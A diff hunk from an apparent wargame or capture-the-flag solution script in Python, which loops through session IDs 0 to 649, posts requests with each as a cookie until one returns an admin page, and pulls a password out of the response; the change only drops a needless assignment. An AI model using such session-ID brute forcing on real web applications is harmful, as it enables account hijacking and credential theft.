@@ -26,7 +26,7 @@ for i in range(0, 650):
     response = requests.post(url=URL, data=DATA, auth=AUTH, cookies=cookies)
     if 'You are an admin' in response.text:
         print('FOUND THE ADMIN SESSION ID ->', i)
-        match = print('password', re.findall(r'Password: (.*?)</pre>', response.text))
+        print('password', re.findall(r'Password: (.*?)</pre>', response.text))
         break
     if response.status_code != 200:
         print('\r\nERROR', response.status_code, i)
